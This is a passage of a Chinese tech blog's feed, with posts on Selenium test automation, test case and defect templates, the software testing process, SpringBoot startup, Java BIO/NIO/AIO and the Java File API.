id="操作alter"><a href="#操作alter" class="headerlink" title="操作alter"></a>操作alter</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612290819266.png" alt="1612290819266"></p><p> 记得加延时,把样式显示出来<img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612291040232.png" alt="1612291040232"></p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612291459443.png" alt="1612291459443"></p><p> 版本问题,<strong>switch_to.alert</strong></p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612291772707.png" alt="1612291772707"></p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612291951410.png" alt="1612291951410"></p><h4 id="多表单处理"><a href="#多表单处理" class="headerlink" title="多表单处理"></a>多表单处理</h4><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612372404933.png" alt="1612372404933"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612372992770.png" alt="1612372992770"></p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612373068712.png" alt="1612373068712"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612373570630.png" alt="1612373570630"></p><h4 id="元素等待"><a href="#元素等待" class="headerlink" title="元素等待"></a>元素等待</h4><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612373947759.png" alt="1612373947759"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612375105716.png" alt="1612375105716"></p><p> <img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612375984593.png" alt="1612375984593"></p><p>可以设置抛出的信息：</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612376006321.png" alt="1612376006321"> </p><p>判断：</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612376670647.png" alt="1612376670647"></p><p>注意：</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612376761036.png" alt="1612376761036"></p><h5 id="系统等待"><a href="#系统等待" class="headerlink" title="系统等待"></a>系统等待</h5><p>time.sleep(5)</p><h2 id="自动化测试用例设计"><a href="#自动化测试用例设计" class="headerlink" title="自动化测试用例设计"></a>自动化测试用例设计</h2><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612546256022.png" alt="1612546256022"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612455083120.png" alt="1612455083120"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612458657522.png" alt="1612458657522"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612458617545.png" alt="1612458617545"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612458302921.png" alt="1612458302921"></p><h2 id="自动化测试模型"><a href="#自动化测试模型" class="headerlink" title="自动化测试模型"></a>自动化测试模型</h2><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612540746961.png" alt="1612540746961"></p><h4 id="线性测试"><a href="#线性测试" class="headerlink" title="线性测试"></a>线性测试</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1613234642404.png" alt="1613234642404"></p><h4 id="模块化驱动测试"><a href="#模块化驱动测试" class="headerlink" title="模块化驱动测试"></a>模块化驱动测试</h4><p>class very_login():</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612547219237.png" alt="1612547219237"></p><p>悬浮</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612547421180.png" alt="1612547421180"></p><h4 id="数据驱动测试"><a href="#数据驱动测试" class="headerlink" title="数据驱动测试"></a>数据驱动测试</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612628515235.png" alt="1612628515235"></p><ul><li>字典</li><li>csv文件（excel文件）</li><li>数据库</li><li>配置文件</li><li>数据的参数化</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612628547080.png" alt="1612628547080"></p><h5 id="one-字典："><a href="#one-字典：" class="headerlink" title=":one:字典："></a>:one:字典：</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612633589340.png" alt="1612633589340"></p><h5 id="two-csv文件"><a href="#two-csv文件" class="headerlink" title=":two:csv文件"></a>:two:csv文件</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612635083102.png" alt="1612635083102"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612635099344.png" alt="1612635099344"></p><p>import csv</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612635490538.png" alt="1612635490538"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    print(d)</span><br></pre></td></tr></table></figure><h5 id="添加xlrd模块（excel文件）"><a href="#添加xlrd模块（excel文件）" class="headerlink" title="添加xlrd模块（excel文件）"></a><strong>添加xlrd模块</strong>（excel文件）</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612637116599.png" alt="1612637116599"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Selenium&quot;&gt;&lt;a href=&quot;#Selenium&quot; class=&quot;headerlink&quot; title=&quot;Selenium&quot;&gt;&lt;/a&gt;Selenium&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;浏览器插件Selenium IDE&lt;/p&gt;
&lt;/blockquot
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Test case</title>
    <link href="https://kayleh.top/test-case/"/>
    <id>https://kayleh.top/test-case/</id>
    <published>2021-01-24T17:51:10.000Z</published>
    <updated>2021-01-27T18:49:31.226Z</updated>
    
    <content type="html"><![CDATA[<h1 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h1><h4 id="什么是测试用例"><a href="#什么是测试用例" class="headerlink" title="什么是测试用例"></a>什么是测试用例</h4><p> 测试用例(Test Case)是指对一项特定的软件产品进行测试任务的描述，体现测试方案、方法、技术和策略。其内容包括测试目标、测试环境、输入数据、测试步骤、预期结果、测试脚本等，最终形成文档。简单地认为，测试用例是为某个特殊目标而编制的一组测试输入、执行条件以及预期结果，用于核实是否满足某个特定软件需求。 </p><h5 id="回归测试"><a href="#回归测试" class="headerlink" title="回归测试"></a>回归测试</h5><h5 id="模板：（excel）"><a href="#模板：（excel）" class="headerlink" title="模板：（excel）"></a>模板：（excel）</h5><div class="table-container"><table><thead><tr><th>测试用例编号</th><th>测试项</th><th>依赖用例</th><th>测试步骤</th><th>输入数据</th><th>预期结果</th><th>测试结果</th><th>测试人</th><th>备注</th></tr></thead><tbody><tr><td></td><td></td><td></td><td>1、2、</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>标识符(用例编号)，一般编号规则：TestCase<strong>_</strong>项目名称<strong>_</strong>模块名称<strong>_</strong>功能名称<strong>_</strong>0001</td><td>测试用例的测试目的。一般情况下，用一句话表明目的。（用谷歌浏览器打开百度首页）</td><td>一般功能流程上，下游的功能测试依赖于上游的功能测试的用例</td><td>用最朴实的语言，写出来软件的操作步骤，要尽量详细（在文本框输入xxx）</td><td>测试数据</td><td>准确，在重要的步骤之后，设定预期结果，一般和测试目的密切相关</td><td>只有两个，通过/失败（和预期结果）</td><td></td></tr></tbody></table></div><h4 id="测试用例编写注意事项"><a href="#测试用例编写注意事项" class="headerlink" title="测试用例编写注意事项"></a>测试用例编写注意事项</h4><h4 id="黑盒测试用例设计方法"><a href="#黑盒测试用例设计方法" class="headerlink" title="黑盒测试用例设计方法"></a>黑盒测试用例设计方法</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;测试用例&quot;&gt;&lt;a href=&quot;#测试用例&quot; class=&quot;headerlink&quot; title=&quot;测试用例&quot;&gt;&lt;/a&gt;测试用例&lt;/h1&gt;&lt;h4 id=&quot;什么是测试用例&quot;&gt;&lt;a href=&quot;#什么是测试用例&quot; class=&quot;headerlink&quot; title=&quot;什么是
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Software testing process</title>
    <link href="https://kayleh.top/program-test/"/>
    <id>https://kayleh.top/program-test/</id>
    <published>2021-01-15T17:17:42.000Z</published>
    <updated>2021-01-31T18:47:16.727Z</updated>
    
    <content type="html"><![CDATA[<h1 id="软件测试流程"><a href="#软件测试流程" class="headerlink" title="软件测试流程"></a>软件测试流程</h1><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/软件测试流程/1610797689455.png" alt="1610797689455"></p><h2 id="过程模型"><a href="#过程模型" class="headerlink" title="过程模型"></a>过程模型</h2><h3 id="★V模型"><a href="#★V模型" class="headerlink" title="★V模型"></a>★V模型</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/软件测试流程/1610798317382.png" alt="1610798317382"></p><h3 id="★W模型"><a href="#★W模型" class="headerlink" title="★W模型"></a>★W模型</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/软件测试流程/1610799034052.png" alt="1610799034052"></p><h3 id="H模型"><a href="#H模型" class="headerlink" title="H模型"></a>H模型</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/软件测试流程/1610800924088.png" alt="1610800924088"></p><h3 id="X模型"><a href="#X模型" class="headerlink" title="X模型"></a>X模型</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/软件测试流程/1610801339901.png" alt="1610801339901"></p><h2 id="测试过程理念"><a href="#测试过程理念" class="headerlink" title="测试过程理念"></a>测试过程理念</h2><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/软件测试流程/1610802495380.png" alt="1610802495380"></p><h3 id="软件测试的分类"><a href="#软件测试的分类" class="headerlink" title="软件测试的分类"></a>软件测试的分类</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/软件测试流程/1610811373564.png" alt="1610811373564"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/软件测试流程/1610811498245.png" alt="1610811498245"></p><h1 id="测试需求分析"><a href="#测试需求分析" class="headerlink" title="测试需求分析"></a>测试需求分析</h1><p>1.列出待测需求</p><p>2.设定需求优先级</p><p>3.详细描述测试需求内容</p><p>4.经过评审并通过</p><p>5.需求统计及分析</p><div class="table-container"><table><thead><tr><th>测试需求编号</th><th>测试需求名称</th><th>质量特性</th><th>所在模块</th><th>所在页面</th><th>优先级</th><th>负责人</th><th>版本号</th><th>需求详情描述</th></tr></thead><tbody><tr><td>JXC-SRS-GN-XT-JBXX-001</td><td>公司名称</td><td>功能特性</td><td>系统设置模块</td><td>基本信息设置模块</td><td>低级</td><td>张三</td><td>v2.1</td><td>1.内容:文本        2.约束:非空</td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table></div><h4 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h4><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611773740638.png" alt="1611773740638"></p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611817748756.png" alt="1611817748756"></p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611818572479.png" alt="1611818572479"></p><h4 id="缺陷报告"><a href="#缺陷报告" class="headerlink" title="缺陷报告"></a>缺陷报告</h4><div class="table-container"><table><thead><tr><th>缺陷编号</th><th>缺陷标题</th><th>状态(new新提交,open确认修改,fixed修改完成,closed回归通过,reopen回归不通过)</th><th>优先级(高,中,低)</th><th>严重程度(致命,严重,一般,轻微,建议)</th><th>提交人</th><th>缺陷描述</th></tr></thead><tbody><tr><td>1</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table></div><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611818765336.png" alt="1611818765336"></p><h3 id="QC"><a href="#QC" class="headerlink" title="QC"></a>QC</h3><p>需求</p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611858108421.png" alt="1611858108421"></p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611858126637.png" alt="1611858126637"></p><p>text plan</p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611858334019.png" alt="1611858334019"></p><p>步骤:</p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611858411788.png" alt="1611858411788"></p><p>test lab</p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611858561200.png" alt="1611858561200"></p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611858628802.png" alt="1611858628802"></p><p>有缺陷时,立即提交缺陷</p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611858681020.png" alt="1611858681020"></p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611858797611.png" alt="1611858797611"></p><h5 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h5><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611858911944.png" alt="1611858911944"></p><h3 id="入库数量用例分析"><a href="#入库数量用例分析" class="headerlink" title="入库数量用例分析"></a>入库数量用例分析</h3><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611861921070.png" alt="1611861921070"></p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1611862130739.png" alt="1611862130739"></p><h3 id="组合测试"><a href="#组合测试" class="headerlink" title="组合测试"></a>组合测试</h3><p>判定表</p><p><img src="/program-test/Blog\source\_posts\软件测试流程\1612106566517.png" alt="1612106566517"></p><h3 id="删除测试"><a href="#删除测试" class="headerlink" title="删除测试"></a>删除测试</h3><p><img src="/program-test/Blog\source\_posts\软件测试流程\1612107740235.png" alt="1612107740235"></p><h3 id="安全测试"><a href="#安全测试" class="headerlink" title="安全测试"></a>安全测试</h3><p>XSS、SQL注入</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;软件测试流程&quot;&gt;&lt;a href=&quot;#软件测试流程&quot; class=&quot;headerlink&quot; title=&quot;软件测试流程&quot;&gt;&lt;/a&gt;软件测试流程&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/kayleh/cdn3/软件测试
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://kayleh.top/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot startup process</title>
    <link href="https://kayleh.top/SpringBoot-startup-process/"/>
    <id>https://kayleh.top/SpringBoot-startup-process/</id>
    <published>2021-01-15T12:40:54.000Z</published>
    <updated>2021-01-17T13:16:30.884Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SpringBoot应用启动流程"><a href="#SpringBoot应用启动流程" class="headerlink" title="SpringBoot应用启动流程"></a>SpringBoot应用启动流程</h2><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/SpringBoot启动过程和注解/640.jpg" alt="图片"> </p><p>我们将各步骤总结精炼如下：</p><ol><li>通过 <code>SpringFactoriesLoader</code> 加载 <code>META-INF/spring.factories</code> 文件，获取并创建 <code>SpringApplicationRunListener</code> 对象</li><li>然后由 <code>SpringApplicationRunListener</code> 来发出 starting 消息</li><li>创建参数，并配置当前 SpringBoot 应用将要使用的 Environment</li><li>完成之后，依然由 <code>SpringApplicationRunListener</code> 来发出 environmentPrepared 消息</li><li>创建 <code>ApplicationContext</code></li><li>初始化 <code>ApplicationContext</code>，并设置 Environment，加载相关配置等</li><li>由 <code>SpringApplicationRunListener</code> 来发出 <code>contextPrepared</code> 消息，告知SpringBoot 应用使用的 <code>ApplicationContext</code> 已准备OK</li><li>将各种 beans 装载入 <code>ApplicationContext</code>，继续由 <code>SpringApplicationRunListener</code> 来发出 contextLoaded 消息，告知 SpringBoot 应用使用的 <code>ApplicationContext</code> 已装填OK</li><li>refresh ApplicationContext，完成IoC容器可用的最后一步</li><li>由 <code>SpringApplicationRunListener</code> 来发出 started 消息</li><li>完成最终的程序的启动</li><li>由 <code>SpringApplicationRunListener</code> 来发出 running 消息，告知程序已运行起来了</li></ol><p>至此，全流程结束！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SpringBoot应用启动流程&quot;&gt;&lt;a href=&quot;#SpringBoot应用启动流程&quot; class=&quot;headerlink&quot; title=&quot;SpringBoot应用启动流程&quot;&gt;&lt;/a&gt;SpringBoot应用启动流程&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http
      
    
    </summary>
    
    
    
      <category term="frame" scheme="https://kayleh.top/tags/frame/"/>
    
  </entry>
  
  <entry>
    <title>the difference of BIO、NIO、AIO</title>
    <link href="https://kayleh.top/bionioaio/"/>
    <id>https://kayleh.top/bionioaio/</id>
    <published>2020-12-20T16:15:14.000Z</published>
    <updated>2021-01-17T13:14:21.608Z</updated>
    
    <content type="html"><![CDATA[<h3 id="BIO、NIO、AIO区别"><a href="#BIO、NIO、AIO区别" class="headerlink" title="BIO、NIO、AIO区别"></a>BIO、NIO、AIO区别</h3><p>一、BIO</p><p>   在JDK1.4出来之前，我们建立网络连接的时候采用BIO模式，需要先在服务端启动一个ServerSocket，然后在客户端启动Socket来对服务端进行通信，默认情况下服务端需要对每个请求建立一堆线程等待请求，而客户端发送请求后，先咨询服务端是否有线程相应，如果没有则会一直等待或者遭到拒绝请求，如果有的话，客户端会线程会等待请求结束后才继续执行。</p><p>二、NIO</p><p>  NIO本身是基于事件驱动思想来完成的，其主要想解决的是BIO的大并发问题： 在使用同步I/O的网络应用中，如果要同时处理多个客户端请求，或是在客户端要同时和多个服务器进行通讯，就必须使用多线程来处理。也就是说，将每一个客户端请求分配给一个线程来单独处理。这样做虽然可以达到我们的要求，但同时又会带来另外一个问题。由于每创建一个线程，就要为这个线程分配一定的内存空间（也叫工作存储器），而且操作系统本身也对线程的总数有一定的限制。如果客户端的请求过多，服务端程序可能会因为不堪重负而拒绝客户端的请求，甚至服务器可能会因此而瘫痪。</p><p>  NIO基于Reactor，当socket有流可读或可写入socket时，操作系统会相应的通知引用程序进行处理，应用再将流读取到缓冲区或写入操作系统。 也就是说，这个时候，已经不是一个连接就要对应一个处理线程了，而是有效的请求，对应一个线程，当连接没有数据时，是没有工作线程来处理的。</p><p>  BIO与NIO一个比较重要的不同，是我们使用BIO的时候往往会引入多线程，每个连接一个单独的线程；而NIO则是使用单线程或者只使用少量的多线程，每个连接共用一个线程。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/BIO、NIO、AIO区别/37237-20151222220329015-207666376.png" alt="img"></p><p>   NIO的最重要的地方是当一个连接创建后，不需要对应一个线程，这个连接会被注册到多路复用器上面，所以所有的连接只需要一个线程就可以搞定，当这个线程中的多路复用器进行轮询的时候，发现连接上有请求的话，才开启一个线程进行处理，也就是一个请求一个线程模式。</p><p>   在NIO的处理方式中，当一个请求来的话，开启线程进行处理，可能会等待后端应用的资源(JDBC连接等)，其实这个线程就被阻塞了，当并发上来的话，还是会有BIO一样的问题。</p><p>　　HTTP/1.1出现后，有了Http长连接，这样除了超时和指明特定关闭的http header外，这个链接是一直打开的状态的，这样在NIO处理中可以进一步的进化，在后端资源中可以实现资源池或者队列，当请求来的话，开启的线程把请求和请求数据传送给后端资源池或者队列里面就返回，并且在全局的地方保持住这个现场(哪个连接的哪个请求等)，这样前面的线程还是可以去接受其他的请求，而后端的应用的处理只需要执行队列里面的就可以了，这样请求处理和后端应用是异步的.当后端处理完，到全局地方得到现场，产生响应，这个就实现了异步处理。</p><p>三、AIO</p><p>   与NIO不同，当进行读写操作时，只须直接调用API的read或write方法即可。这两种方法均为异步的，对于读操作而言，当有流可读取时，操作系统会将可读的流传入read方法的缓冲区，并通知应用程序；对于写操作而言，当操作系统将write方法传递的流写入完毕时，操作系统主动通知应用程序。 即可以理解为，read/write方法都是异步的，完成后会主动调用回调函数。 在JDK1.7中，这部分内容被称作NIO.2，主要在java.nio.channels包下增加了下面四个异步通道：</p><ul><li>AsynchronousSocketChannel</li><li>AsynchronousServerSocketChannel</li><li>AsynchronousFileChannel</li><li>AsynchronousDatagramChannel</li></ul><p>其中的read/write方法，会返回一个带回调函数的对象，当执行完读取/写入操作后，直接调用回调函数。</p><p>BIO是一个连接一个线程。</p><p>NIO是一个请求一个线程。</p><p>AIO是一个有效请求一个线程。</p><p>先来个例子理解一下概念，以银行取款为例： </p><ul><li>同步 ： 自己亲自出马持银行卡到银行取钱（使用同步IO时，Java自己处理IO读写）；</li><li>异步 ： 委托一小弟拿银行卡到银行取钱，然后给你（使用异步IO时，Java将IO读写委托给OS处理，需要将数据缓冲区地址和大小传给OS(银行卡和密码)，OS需要支持异步IO操作API）；</li><li>阻塞 ： ATM排队取款，你只能等待（使用阻塞IO时，Java调用会一直阻塞到读写完成才返回）；</li><li>非阻塞 ： 柜台取款，取个号，然后坐在椅子上做其它事，等号广播会通知你办理，没到号你就不能去，你可以不断问大堂经理排到了没有，大堂经理如果说还没到你就不能去（使用非阻塞IO时，如果不能读写Java调用会马上返回，当IO事件分发器会通知可读写时再继续进行读写，不断循环直到读写完成）</li></ul><p>Java对BIO、NIO、AIO的支持：</p><ul><li>Java BIO ： 同步并阻塞，服务器实现模式为一个连接一个线程，即客户端有连接请求时服务器端就需要启动一个线程进行处理，如果这个连接不做任何事情会造成不必要的线程开销，当然可以通过线程池机制改善。</li><li>Java NIO ： 同步非阻塞，服务器实现模式为一个请求一个线程，即客户端发送的连接请求都会注册到多路复用器上，多路复用器轮询到连接有I/O请求时才启动一个线程进行处理。</li><li>Java AIO(NIO.2) ： 异步非阻塞，服务器实现模式为一个有效请求一个线程，客户端的I/O请求都是由OS先完成了再通知服务器应用去启动线程进行处理，</li></ul><p>BIO、NIO、AIO适用场景分析:</p><ul><li>BIO方式适用于连接数目比较小且固定的架构，这种方式对服务器资源要求比较高，并发局限于应用中，JDK1.4以前的唯一选择，但程序直观简单易理解。</li><li>NIO方式适用于连接数目多且连接比较短（轻操作）的架构，比如聊天服务器，并发局限于应用中，编程比较复杂，JDK1.4开始支持。</li><li>AIO方式使用于连接数目多且连接比较长（重操作）的架构，比如相册服务器，充分调用OS参与并发操作，编程比较复杂，JDK7开始支持。</li></ul><p>另外，I/O属于底层操作，需要操作系统支持，并发也需要操作系统的支持，所以性能方面不同操作系统差异会比较明显。</p><p>在高性能的I/O设计中，有两个比较著名的模式Reactor和Proactor模式，其中Reactor模式用于同步I/O，而Proactor运用于异步I/O操作。</p><p>   在比较这两个模式之前，我们首先的搞明白几个概念，什么是阻塞和非阻塞，什么是同步和异步,同步和异步是针对应用程序和内核的交互而言的，同步指的是用户进程触发IO操作并等待或者轮询的去查看IO操作是否就绪，而异步是指用户进程触发IO操作以后便开始做自己的事情，而当IO操作已经完成的时候会得到IO完成的通知。而阻塞和非阻塞是针对于进程在访问数据的时候，根据IO操作的就绪状态来采取的不同方式，说白了是一种读取或者写入操作函数的实现方式，阻塞方式下读取或者写入函数将一直等待，而非阻塞方式下，读取或者写入函数会立即返回一个状态值。</p><p> 一般来说I/O模型可以分为：同步阻塞，同步非阻塞，异步阻塞，异步非阻塞IO</p><p>同步阻塞IO：在此种方式下，用户进程在发起一个IO操作以后，必须等待IO操作的完成，只有当真正完成了IO操作以后，用户进程才能运行。JAVA传统的IO模型属于此种方式！</p><p>同步非阻塞IO:在此种方式下，用户进程发起一个IO操作以后边可返回做其它事情，但是用户进程需要时不时的询问IO操作是否就绪，这就要求用户进程不停的去询问，从而引入不必要的CPU资源浪费。其中目前JAVA的NIO就属于同步非阻塞IO。</p><p>异步阻塞IO：此种方式下是指应用发起一个IO操作以后，不等待内核IO操作的完成，等内核完成IO操作以后会通知应用程序，这其实就是同步和异步最关键的区别，同步必须等待或者主动的去询问IO是否完成，那么为什么说是阻塞的呢？因为此时是通过select系统调用来完成的，而select函数本身的实现方式是阻塞的，而采用select函数有个好处就是它可以同时监听多个文件句柄，从而提高系统的并发性！</p><p> 异步非阻塞IO:在此种模式下，用户进程只需要发起一个IO操作然后立即返回，等IO操作真正的完成以后，应用程序会得到IO操作完成的通知，此时用户进程只需要对数据进行处理就好了，不需要进行实际的IO读写操作，因为真正的IO读取或者写入操作已经由内核完成了。目前Java中还没有支持此种IO模型。  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;BIO、NIO、AIO区别&quot;&gt;&lt;a href=&quot;#BIO、NIO、AIO区别&quot; class=&quot;headerlink&quot; title=&quot;BIO、NIO、AIO区别&quot;&gt;&lt;/a&gt;BIO、NIO、AIO区别&lt;/h3&gt;&lt;p&gt;一、BIO&lt;/p&gt;
&lt;p&gt;   在JDK1.4出来之
      
    
    </summary>
    
    
    
      <category term="network" scheme="https://kayleh.top/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>Talk about:IO</title>
    <link href="https://kayleh.top/IO/"/>
    <id>https://kayleh.top/IO/</id>
    <published>2020-12-20T14:45:19.000Z</published>
    <updated>2021-01-17T13:19:17.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="File对象"><a href="#File对象" class="headerlink" title="File对象"></a>File对象</h1><p>在计算机系统中，文件是非常重要的存储方式。Java的标准库<code>java.io</code>提供了<code>File</code>对象来操作文件和目录。</p><p>要构造一个<code>File</code>对象，需要传入文件路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"C:\\Windows\\notepad.exe"</span>);</span><br><span class="line">        System.out.println(f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造File对象时，既可以传入绝对路径，也可以传入相对路径。绝对路径是以根目录开头的完整路径，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File f = <span class="keyword">new</span> File(<span class="string">"C:\\Windows\\notepad.exe"</span>);</span><br></pre></td></tr></table></figure><p>注意Windows平台使用<code>\</code>作为路径分隔符，在Java字符串中需要用<code>\\</code>表示一个<code>\</code>。Linux平台使用<code>/</code>作为路径分隔符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File f = <span class="keyword">new</span> File(<span class="string">"/usr/bin/javac"</span>);</span><br></pre></td></tr></table></figure><p>传入相对路径时，相对路径前面加上当前目录就是绝对路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设当前目录是C:\Docs</span></span><br><span class="line">File f1 = <span class="keyword">new</span> File(<span class="string">"sub\\javac"</span>); <span class="comment">// 绝对路径是C:\Docs\sub\javac</span></span><br><span class="line">File f3 = <span class="keyword">new</span> File(<span class="string">".\\sub\\javac"</span>); <span class="comment">// 绝对路径是C:\Docs\sub\javac</span></span><br><span class="line">File f3 = <span class="keyword">new</span> File(<span class="string">"..\\sub\\javac"</span>); <span class="comment">// 绝对路径是C:\sub\javac</span></span><br></pre></td></tr></table></figure><p>可以用<code>.</code>表示当前目录，<code>..</code>表示上级目录。</p><p>File对象有3种形式表示的路径，一种是<code>getPath()</code>，返回构造方法传入的路径，一种是<code>getAbsolutePath()</code>，返回绝对路径，一种是<code>getCanonicalPath</code>，它和绝对路径类似，但是返回的是规范路径。</p><p>什么是规范路径？我们看以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">".."</span>);</span><br><span class="line">        System.out.println(f.getPath());</span><br><span class="line">        System.out.println(f.getAbsolutePath());</span><br><span class="line">        System.out.println(f.getCanonicalPath());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绝对路径可以表示成<code>C:\Windows\System32\..\notepad.exe</code>，而规范路径就是把<code>.</code>和<code>..</code>转换成标准的绝对路径后的路径：<code>C:\Windows\notepad.exe</code>。</p><p>因为Windows和Linux的路径分隔符不同，File对象有一个静态变量用于表示当前平台的系统分隔符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(File.separator); <span 